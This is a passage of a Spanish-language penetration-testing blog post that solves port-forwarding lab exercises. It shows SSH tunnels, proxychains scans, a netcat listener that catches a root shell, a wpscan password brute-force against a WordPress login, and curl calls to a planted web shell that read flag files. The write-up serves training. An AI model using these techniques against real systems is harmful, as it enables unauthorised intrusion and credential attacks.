+tcp                    TIME-WAIT                  0                       0                                             127.0.0.1:54136                                          127.0.0.11:ssh                                             
+tcp                    LISTEN                     0                       128                                                [::]:ssh                                                  [::]:*                                               
+
+┌──(student㉿8772c0f42288)-[~]
+└─$ curl 127.0.0.1 51029
+here is your flag:
+
+OS{fa246875e18f2489ee28822247725fd7}
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="2-practice---ssh-remote-port-forwarding">2. Practice - SSH remote port forwarding.</h3>
+
+<p>Primero activamos en nuestra máquina local el servcio SSH con systemctl.</p>
+
+<p>Luego, en la máquina virtual de prueba introducimos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(student㉿3d924c31581c)-[~]
+└─$ ssh -L 5555:192.168.45.240:4444 kali@192.168.45.240
+The authenticity of host '192.168.45.240 (192.168.45.240)' can't be established.
+ED25519 key fingerprint is SHA256:JFdrX0EwWlz6dQ/mvpkh6bNOpMr5T+Yf8hsdDPmGIdU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.45.240' (ED25519) to the list of known hosts.
+kali@192.168.45.240's password: 
+bind [::1]:5555: Cannot assign requested address
+Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+</code></pre></div></div>
+
+<p>Seguidamente activamos un listener de netcat en el puerto 4444 en nuestra máquina local y obtendremos en poco tiempo una shell de root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444                               
+listening on [any] 4444 ...
+192.168.45.240: inverse host lookup failed: Unknown host
+connect to [192.168.45.240] from (UNKNOWN) [192.168.45.240] 34980
+bash: cannot set terminal process group (130): Inappropriate ioctl for device
+bash: no job control in this shell
+root@3d924c31581c:~# cat /root/flag.txt
+cat /root/flag.txt
+OS{aaf6ff4a117d7a6684c15eed3821f3b8}
+</code></pre></div></div>
+
+<h3 id="3-practice---shh-dinamic-port-forwarding">3. Practice - SHH dinamic port forwarding.</h3>
+
+<p><strong>6.  There is a service running on some TCP port in the range of <em>30000-35000</em> on the target VM #1. Find it, and you will find the flag. <em>Note</em>: this scan will take a couple minutes to complete, even with you only scanning such a limited range.</strong></p>
+
+<p>En este caso, según el enunciado existe un servicio escuchando en la máquina remota. Intentando escanear la máquina de forma externa con Nmap no encontramos nada:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -Pn --min-rate 10000 192.168.209.52 -p-       
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 08:25 EDT
+Nmap scan report for 192.168.209.52
+Host is up (0.030s latency).
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
+2222/tcp  open     ssh     OpenSSH 8.7p1 Debian 2 (protocol 2.0)
+
+</code></pre></div></div>
+
+<p>Con lo que se vuelve evidente que necesitamos escanear los servicios internos (aquellos que sólo están escuchando peticiones procedentes de direcciones internas como el loopback) de la máquina remota. Podríamos relizar esta tarea manualmente pero dado el rango disponibles de IPs nos tardaríamos una eternidad. Para agilizar el proceso podemos utilizar <em>Proxychains</em> y realizar un <em>SSH Dynamic Port Forwarding</em>.</p>
+
+<p>En primer lugar, como Proxychains funciona por defecto sobre el puerto 9050, utilizamos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -N -D 127.0.0.1:9050 student@192.168.209.52 -p 2222  
+</code></pre></div></div>
+
+<p>Este comando tuneliza sobre SSH el tráfico dirigido sobre el puerto local 9050 hacia la máquina 192.168.209.52 como el usuario <em>student</em>.</p>
+
+<p>Ahora empleamos Proxychains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap -sTV -n -PN 127.0.0.1 -p 30000-35000
+[...]
+
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023 &lt;--socket error or timeout!
+Nmap scan report for 127.0.0.1
+Host is up (0.037s latency).
+Not shown: 5000 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+34023/tcp open  unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 198.56 seconds
+</code></pre></div></div>
+
+<p>Proxychains se aprovecha de la tunnelización SSH construida con el coamndo anterior para enviar el tráfico generado por Nmap sobre el usuario student en la máquina con IP 192.168.209.52 y este a su vez dirige los paquetes como si los hubiera enviado él, de forma que se pone en contacto con sus puertos locales en un rango del 30000 al 35000 escaneando así localmente la máquina con Nmap y devuelve el output a proxychains.</p>
+
+<p>Finalmente se descubre un servicio escuchando sobre 127.0.0.1:34023. Volvemos a utilizar proxychains para redirigir el tráfico de netcat y obtenemos una shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ proxychains nc 127.0.0.1 34023       
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023  ...  OK
+ls
+flag.txt
+cat flag.txt
+OS{14c62796d2eae4f37ed8f79b359acaa7}       
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>7.  There is a WordPress instance running on the target VM #2 that is only accessible locally. The flag is not simply in a post once you log in - you need to use this administrative web to gain access to the box as <em>www-data</em>. To save you time, the admin user is <em>offsec</em>. Use your local user SSH access to forward your password attack traffic to this server to determine the admin password. Then, utilize this admin access to get a web shell and, finally, read <em>/home/flag.txt</em> to solve this challenge. <em>Note</em>: for this exercise try different well-known wordlists. Also, make sure to block browser’s DNS requests over proxychains.</strong></p>
+
+<p>Para este caso, volvemos a escanear la máquina con Proxychains de la misma forma en la que hemos procedido en el ejercicio anterior.</p>
+
+<p>El escaneo resuelve la existencia de un puerto 80 en la máquina remota accesible localmente que tiene un portal Wordpress tal y cómo predice el enunciado del ejercicio.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap -A -n -PN 127.0.0.1 -p- --min-rate 10000
+
+[...]
+
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
+Nmap scan report for 127.0.0.1
+Host is up (0.038s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-title: Port Forwarding Challenge &amp;#8211; Just another WordPress site
+|_http-generator: WordPress 5.8.2
+|_http-server-header: Apache/2.4.51 (Debian)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
+</code></pre></div></div>
+
+<p>Así, de esta forma, lanzamos firefox a través de proxychains para investigar la página:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains firefox http://127.0.0.1:80/wp-login.php 
+</code></pre></div></div>
+
+<p>Nos encontramos con un potal de logeo común, realizamos un logeo de prueba para comprobar la reacción de la página ante un logeo inválido:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230312145715.png" text-align="center" />
+</div>
+
+<p>De esta forma, inspeccionamos los parámetros de la request a través de DevTools y formamos el siguiente comando con <em>wpscan</em> a través de proxychains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan --update
+</code></pre></div></div>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains -q wpscan --url http://127.0.0.1:80/ --usernames offsec --passwords /usr/share/wordlists/rockyou.txt
+
+[...]
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - offsec / 555666                                                                                          
+Trying offsec / missy1 Time: 00:01:02 &lt;                                     &gt; (1885 / 14346277)  0.01%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: offsec, Password: 555666
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Mar 12 11:19:46 2023
+[+] Requests Done: 2057
+[+] Cached Requests: 5
+[+] Data Sent: 672 KB
+[+] Data Received: 12.57 MB
+[+] Memory used: 272.699 MB
+[+] Elapsed time: 00:01:13
+</code></pre></div></div>
+
+<p>De esta forma, hemos encontrado unas credenciales válidas y procedemos a logearnos y nos encontramos con un sitio web de Wordpress. Seguimos las indicaciones para crear un plugin malicioso con el que obtener una webshell y leer la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains firefox --new-window http://127.0.0.1:80/wp-login.php
+</code></pre></div></div>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230312203151.png" text-align="center" />
+</div>
+
+<p>Lo activamos y empleamos curl para obtener la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains curl "http://127.0.0.1:80/wp-content/plugins/simple_shell/simple_shell.php?cmd=cat+/home/flag.txt"
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
+&lt;pre&gt;OS{4d773b497a8816027c105b13cb0a72da}&lt;/pre&gt; 
+</code></pre></div></div>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#pen">pen</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Port+Forwarding&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-11-11.Port_Forwarding%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-11-11-11.Port_Forwarding%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-11-11.Port_Forwarding%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2023-11-10-10.Privilege_Escalation/" data-toggle="tooltip" data-placement="top" title="Privilege Escalation">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2023-11-12-12.Active_Directory_Attacks/" data-toggle="tooltip" data-placement="top" title="Active Directory Attacks">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
